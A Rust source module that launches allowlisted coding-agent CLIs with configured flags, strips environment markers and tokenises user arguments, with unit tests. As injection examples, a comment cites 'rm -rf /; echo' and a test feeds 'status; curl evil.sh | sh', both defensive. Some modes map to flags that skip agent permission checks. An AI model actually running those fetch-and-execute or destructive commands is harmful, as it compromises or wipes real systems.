//! Which command-line tools may be launched, and how.
//!
//! An allowlist of *executables*, never a free-text command. Arguments are
//! configurable and the program name is not, because "run whatever this string
//! says" in a desktop application is a remote-code-execution primitive dressed
//! as a preference.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

/// A coding agent axio can host in a terminal it owns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Harness {
    /// axio itself, in its interactive surface.
    Axio,
    Claude,
    Codex,
    Pi,
}

impl Harness {
    /// Every harness, in the order a picker should offer them.
    pub const ALL: &'static [Harness] =
        &[Harness::Axio, Harness::Claude, Harness::Codex, Harness::Pi];

    /// The executable. Fixed per harness and never taken from configuration.
    pub fn executable(self) -> &'static str {
        match self {
            Harness::Axio => "axio",
            Harness::Claude => "claude",
            Harness::Codex => "codex",
            Harness::Pi => "pi",
        }
    }

    /// What a person calls it.
    pub fn label(self) -> &'static str {
        match self {
            Harness::Axio => "axio",
            Harness::Claude => "Claude Code",
            Harness::Codex => "Codex",
            Harness::Pi => "Pi",
        }
    }

    /// What brings back the conversation a previous run left in the same
    /// directory, for a terminal resumed after the window that hosted it was
    /// closed. Empty where the tool cannot be told to without an id it does
    /// not have — axio's `--resume` wants one, and Codex's `resume --last`
    /// means the most recent session anywhere, not here — and then a resume
    /// is a fresh start in the same worktree, which is still the work.
    pub fn resume_args(self) -> &'static [&'static str] {
        match self {
            Harness::Axio | Harness::Codex => &[],
            Harness::Claude => &["--continue"],
            Harness::Pi => &["--continue"],
        }
    }

    /// The resume with the tool's own session id, when one was learned from
    /// its hooks: exact, where `resume_args` is "the most recent one here".
    /// Without an id, `resume_args`.
    pub fn resume_args_for(self, session: Option<&str>) -> Vec<String> {
        match (self, session) {
            (Harness::Claude, Some(id)) => vec!["--resume".to_owned(), id.to_owned()],
            (Harness::Codex, Some(id)) => vec!["resume".to_owned(), id.to_owned()],
            (Harness::Axio, Some(id)) => vec!["--resume".to_owned(), id.to_owned()],
            _ => self.resume_args().iter().map(|a| (*a).to_owned()).collect(),
        }
    }

    /// How the tool is told to report its state to `script` as it runs —
    /// per process, on its command line, so only a hosted session reports
    /// and nothing is written into the person's own configuration. The
    /// script is called with the event name and, for Codex, the payload;
    /// Claude Code hands the payload on stdin. Where the tool has no such
    /// mechanism the list is empty and the host falls back to watching
    /// output and in-band status.
    pub fn hook_args(self, script: &str) -> Vec<String> {
        match self {
            Harness::Claude => {
                let hook = |event: &str| {
                    format!(
                        r#""{event}":[{{"hooks":[{{"type":"command","command":{cmd}}}]}}]"#,
                        cmd =
                            serde_json::to_string(&format!("{script} {event}")).unwrap_or_default()
                    )
                };
                let settings = format!(
                    "{{\"hooks\":{{{}}}}}",
                    [
                        "SessionStart",
                        "UserPromptSubmit",
                        "Stop",
                        "Notification",
                        "PermissionRequest"
                    ]
                    .map(hook)
                    .join(",")
                );
                vec!["--settings".to_owned(), settings]
            }
            Harness::Codex => vec![
                "-c".to_owned(),
                format!("notify=[{}, \"codex\"]", toml_string(script)),
            ],
            Harness::Axio | Harness::Pi => Vec::new(),
        }
    }

    /// How a first prompt is handed to the tool on its command line, where
    /// the tool takes one and still opens its interface — `None` where it
    /// does not, and then the prompt is typed in once the interface is up.
    /// The command line beats typing: nothing to wait for, nothing to
    /// mistake for a paste, and the tool's own quoting rules do not apply.
    pub fn prompt_args(self, prompt: &str) -> Option<Vec<String>> {
        match self {
            Harness::Claude | Harness::Codex => Some(vec![prompt.to_owned()]),
            Harness::Axio | Harness::Pi => None,
        }
    }

    /// How the tool is told what it may do without asking. Four modes,
    /// one product concept, mapped to each tool's own flags: `ask` (every
    /// change is a question, the tool's default), `edits` (edits go through,
    /// commands ask), `auto` (the tool decides), `full` (nothing asks).
    /// Where a tool has no such flag the mode is dropped, not passed.
    pub fn permission_args(self, mode: &str) -> Vec<String> {
        let s = |xs: &[&str]| xs.iter().map(|x| (*x).to_owned()).collect::<Vec<_>>();
        match (self, mode) {
            (Harness::Claude, "edits") => s(&["--permission-mode", "acceptEdits"]),
            (Harness::Claude, "auto") => s(&["--permission-mode", "auto"]),
            (Harness::Claude, "full") => s(&["--dangerously-skip-permissions"]),
            (Harness::Codex, "ask") => s(&["-a", "untrusted", "-s", "read-only"]),
            (Harness::Codex, "edits") => s(&["-a", "on-request", "-s", "workspace-write"]),
            (Harness::Codex, "auto") => s(&["--full-auto"]),
            (Harness::Codex, "full") => s(&["--dangerously-bypass-approvals-and-sandbox"]),
            _ => Vec::new(),
        }
    }

    /// How the tool is told which model to use, on its command line. Every
    /// harness has one; the flag differs.
    pub fn model_args(self, model: &str) -> Vec<String> {
        match self {
            Harness::Axio => vec!["--model".to_owned(), model.to_owned()],
            Harness::Claude => vec!["--model".to_owned(), model.to_owned()],
            Harness::Codex => vec!["-m".to_owned(), model.to_owned()],
            Harness::Pi => vec!["--model".to_owned(), model.to_owned()],
        }
    }

    /// How the tool is told how hard to think, where it can be told at all.
    /// Codex takes a reasoning effort as a config override; the others have
    /// no such flag on their command line, and an effort given for them is
    /// dropped rather than passed as something they would refuse to start on.
    pub fn effort_args(self, effort: &str) -> Vec<String> {
        match self {
            Harness::Codex => vec![
                "-c".to_owned(),
                format!("model_reasoning_effort=\"{effort}\""),
            ],
            Harness::Axio | Harness::Claude | Harness::Pi => Vec::new(),
        }
    }

    /// The slash commands the tool's own interface answers to, with a word
    /// on each, for a composer that is not that interface to offer them. The
    /// built-in set as shipped; commands a person added — Claude Code's
    /// `.claude/commands` and skills — are found by the caller, since they
    /// live in directories this list cannot know.
    pub fn slash_commands(self) -> &'static [(&'static str, &'static str)] {
        match self {
            Harness::Axio => &[
                ("/help", "what the surface can do"),
                ("/status", "what this session is set to do"),
                ("/model", "change model mid-session"),
                ("/login", "store a credential"),
                ("/new", "a fresh session, with a prompt"),
                ("/sessions", "recent sessions"),
                ("/clear", "clear the screen"),
                ("/quit", "leave"),
            ],
            Harness::Claude => &[
                ("/add-dir", "let it read another directory"),
                ("/agents", "manage subagents"),
                ("/clear", "start a fresh conversation"),
                ("/compact", "summarise the conversation so far"),
                ("/config", "settings"),
                ("/context", "what is in the context window"),
                ("/cost", "what this session has spent"),
                ("/doctor", "check the install"),
                ("/export", "save the conversation"),
                ("/fast", "toggle fast mode"),
                ("/help", "commands and shortcuts"),
                ("/hooks", "manage hooks"),
                ("/ide", "connect to an editor"),
                ("/init", "write a CLAUDE.md for this repository"),
                ("/login", "sign in"),
                ("/logout", "sign out"),
                ("/mcp", "MCP servers"),
                ("/memory", "edit the memory files"),
                ("/model", "change model"),
                ("/output-style", "how it writes"),
                ("/permissions", "what it may do without asking"),
                ("/plan", "plan before acting"),
                ("/pr-comments", "read the pull request's comments"),
                ("/resume", "pick up an earlier conversation"),
                ("/review", "review the changes"),
                ("/rewind", "go back to an earlier point"),
                ("/status", "account, model and version"),
                ("/statusline", "configure the status line"),
                ("/usage", "plan usage and limits"),
                ("/vim", "vim keybindings"),
            ],
            Harness::Codex => &[
                ("/model", "change model or reasoning effort"),
                ("/approvals", "what it may do without asking"),
                ("/new", "start a fresh conversation"),
                ("/init", "write an AGENTS.md for this repository"),
                ("/compact", "summarise the conversation so far"),
                ("/diff", "changes so far"),
                ("/mention", "mention a file"),
                ("/status", "session and account"),
                ("/mcp", "MCP servers"),
                ("/review", "review the changes"),
                ("/resume", "pick up an earlier conversation"),
                ("/undo", "undo the last change"),
                ("/clear", "clear the screen"),
                ("/logout", "sign out"),
                ("/quit", "leave"),
            ],
            Harness::Pi => &[
                ("/model", "change model"),
                ("/new", "start a fresh session"),
                ("/clear", "clear the screen"),
                ("/compact", "summarise the conversation so far"),
                ("/resume", "pick up an earlier session"),
                ("/session", "this session"),
                ("/settings", "settings"),
                ("/help", "commands and shortcuts"),
                ("/login", "sign in to a provider"),
                ("/export", "save the session"),
                ("/copy", "copy the last reply"),
                ("/name", "name this session"),
                ("/fork", "fork the session"),
                ("/tree", "the session tree"),
                ("/branch", "branch the session"),
                ("/reload", "reload extensions"),
                ("/hotkeys", "keyboard shortcuts"),
                ("/quit", "leave"),
            ],
        }
    }

    /// The CSS custom property a surface colours this harness with.
    ///
    /// Named here rather than in the frontend so one list decides it. A colour
    /// chosen in TypeScript for a harness defined in Rust is two lists that
    /// disagree the first time one gains an entry.
    pub fn accent_var(self) -> &'static str {
        match self {
            Harness::Axio => "--agent-axio",
            Harness::Claude => "--agent-claude",
            Harness::Codex => "--agent-codex",
            Harness::Pi => "--agent-pi",
        }
    }

    /// Where the executable is, if this process can see it at all.
    ///
    /// `PATH` as the process has it — which for a desktop application launched
    /// from a dock is the login shell's, not the terminal's. axio's own binary
    /// is looked for beside this one first, because the window and the CLI
    /// ship together and a person who has not put `axio` on their path should
    /// still be able to open it here.
    ///
    /// `None` means the harness must not be offered: a launcher that fails with
    /// a page of `PATH` is worse than one that is not there.
    pub fn locate(self) -> Option<PathBuf> {
        if self == Harness::Axio
            && let Ok(me) = std::env::current_exe()
            && let Some(dir) = me.parent()
            && let Some(found) = locate_in(std::iter::once(dir.to_path_buf()), self.executable())
        {
            return Some(found);
        }
        let path = std::env::var_os("PATH")?;
        locate_in(std::env::split_paths(&path), self.executable())
    }

    pub fn parse(name: &str) -> Option<Self> {
        match name.to_ascii_lowercase().as_str() {
            "axio" => Some(Harness::Axio),
            "claude" => Some(Harness::Claude),
            "codex" => Some(Harness::Codex),
            "pi" => Some(Harness::Pi),
            _ => None,
        }
    }
}

/// The first directory in `dirs` holding an executable called `name`.
///
/// On Windows the name is tried with the extensions `PATHEXT` would supply for
/// the cases that matter here — a native `.exe`, and the `.cmd` and `.bat`
/// shims npm writes — because that is what `cmd.exe /c name` would resolve.
fn locate_in(dirs: impl IntoIterator<Item = PathBuf>, name: &str) -> Option<PathBuf> {
    #[cfg(windows)]
    const EXTENSIONS: &[&str] = &["exe", "cmd", "bat"];
    #[cfg(not(windows))]
    const EXTENSIONS: &[&str] = &[];
    for dir in dirs {
        if dir.as_os_str().is_empty() {
            continue;
        }
        let bare = dir.join(name);
        if is_executable(&bare) {
            return Some(bare);
        }
        for ext in EXTENSIONS {
            let candidate = dir.join(format!("{name}.{ext}"));
            if is_executable(&candidate) {
                return Some(candidate);
            }
        }
    }
    None
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

#[cfg(not(unix))]
fn is_executable(path: &Path) -> bool {
    path.is_file()
}

/// Variables never passed to a hosted agent.
///
/// The first four are not hygiene, they are correctness: a tool that finds them
/// in its environment concludes it was started *by a copy of itself* and behaves
/// as a child session — reusing a conversation, or refusing to start one. axio
/// may itself have been launched by one of these, so they have to go.
///
/// `NO_COLOR` is the other half. axio strips colour from the tools *it* runs so
/// the model does not read escape codes; a hosted agent is being read by a
/// person through a real terminal, and inheriting that setting renders every one
/// of them monochrome.
const STRIP: &[&str] = &[
    "CLAUDE_CODE_CHILD_SESSION",
    "CLAUDE_CODE_ENTRYPOINT",
    "CLAUDE_CODE_SESSION_ID",
    "CLAUDE_PID",
    "NO_COLOR",
];

/// Names that must not reach a hosted agent, for a caller that removes rather
/// than rebuilds.
pub fn stripped_names() -> &'static [&'static str] {
    STRIP
}

/// A TOML basic string of `s`, for a `-c key=value` override.
fn toml_string(s: &str) -> String {
    format!("\"{}\"", s.replace('\\', "\\\\").replace('"', "\\\""))
}

/// The environment a hosted agent runs in.
///
/// The two that tell it a real terminal is on the other end. `TERM=dumb` —
/// which axio sets for its own tools — would make a provider's interface
/// unusable.
///
/// What this deliberately no longer does is rebuild the whole environment minus
/// [`STRIP`]. It used to, and it did nothing: a `CommandBuilder` inherits the
/// parent's environment by default and `env()` only adds or overrides, so
/// filtering a list on the way in removed nothing on the way out. Every hosted
/// agent inherited every marker, decided it was a child of itself, and turned
/// off transcript saving. Removal has to be asked for by name — see
/// [`stripped_names`].
pub fn child_env() -> Vec<(String, String)> {
    vec![
        ("TERM".to_owned(), "xterm-256color".to_owned()),
        ("COLORTERM".to_owned(), "truecolor".to_owned()),
    ]
}

/// Split configured arguments the way a shell would, without running one.
///
/// Tokenised rather than interpreted: `rm -rf /; echo` becomes five arguments
/// to the harness, not two commands. A null byte is refused outright because it
/// cannot survive the boundary into a process argument, and an unbalanced quote
/// is an error rather than a guess.
pub fn split_args(raw: &str) -> Result<Vec<String>, String> {
    if raw.contains('\0') {
        return Err("arguments may not contain a null byte".to_owned());
    }
    shlex::split(raw).ok_or_else(|| format!("could not split arguments: {raw}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_harness_is_named_by_its_own_list_not_by_a_caller() {
        for harness in Harness::ALL {
            assert_eq!(Harness::parse(harness.executable()), Some(*harness));
            assert!(!harness.label().is_empty());
            assert!(harness.accent_var().starts_with("--agent-"));
        }
        assert_eq!(Harness::parse("CLAUDE"), Some(Harness::Claude));
        assert_eq!(Harness::parse("rm"), None, "the allowlist is the allowlist");
    }

    /// The four markers are the reason this exists. A hosted agent that
    /// inherits them decides it is a child of itself.
    ///
    /// This asserts against a *built command*, not against the list. The
    /// previous version checked that `STRIP` contained each name, which it
    /// always did — while the child inherited every one of them anyway, because
    /// nothing ever asked the builder to remove them. A test that reads the
    /// constant it is testing cannot fail.
    #[test]
    fn the_session_markers_never_reach_a_hosted_agent() {
        let mut command = portable_pty::CommandBuilder::new("cmd.exe");
        for name in stripped_names() {
            command.env_remove(name);
        }
        for (key, value) in child_env() {
            command.env(key, value);
        }

        for marker in [
            "CLAUDE_CODE_CHILD_SESSION",
            "CLAUDE_CODE_ENTRYPOINT",
            "CLAUDE_CODE_SESSION_ID",
            "CLAUDE_PID",
            "NO_COLOR",
        ] {
            assert!(
                stripped_names().contains(&marker),
                "{marker} is not on the list"
            );
            assert_eq!(
                command.get_env(marker),
                None,
                "{marker} still reaches the child"
            );
        }
    }

    /// axio strips colour from the tools it runs because a model reads them.
    /// A person reads these, so the opposite is right.
    #[test]
    fn a_hosted_agent_is_told_a_real_terminal_is_watching() {
        let env = child_env();
        assert!(
            env.iter()
                .any(|(k, v)| k == "TERM" && v == "xterm-256color")
        );
        assert!(env.iter().any(|(k, _)| k == "COLORTERM"));
        assert!(
            !env.iter().any(|(k, _)| k == "NO_COLOR"),
            "inheriting NO_COLOR renders every hosted agent monochrome"
        );
    }

    #[test]
    fn arguments_are_tokenised_rather_than_interpreted() {
        assert_eq!(
            split_args("--model sonnet --yes").unwrap(),
            ["--model", "sonnet", "--yes"]
        );
        // One command's arguments, never two commands.
        assert_eq!(
            split_args("status; curl evil.sh | sh").unwrap().len(),
            5,
            "a metacharacter is an argument here, not an operator"
        );
        assert!(split_args("--unbalanced \"quote").is_err());
        assert!(split_args("a\0b").is_err());
    }

    #[test]
    fn locate_finds_an_executable_and_skips_a_plain_file() {
        let dir = std::env::temp_dir().join(format!("axio-pty-locate-{}", std::process::id()));
        std::fs::create_dir_all(&dir).expect("a directory");
        let exe = dir.join("codex");
        std::fs::write(&exe, "#!/bin/sh\n").expect("written");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).expect("chmod");
        }
        std::fs::write(dir.join("pi"), "not runnable").expect("written");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(dir.join("pi"), std::fs::Permissions::from_mode(0o644))
                .expect("chmod");
        }

        assert_eq!(locate_in([dir.clone()], "codex"), Some(exe));
        #[cfg(unix)]
        assert_eq!(locate_in([dir.clone()], "pi"), None);
        assert_eq!(locate_in([dir.clone()], "claude"), None);
        assert_eq!(
            locate_in([PathBuf::new()], "codex"),
            None,
            "an empty entry is not `.`"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
}
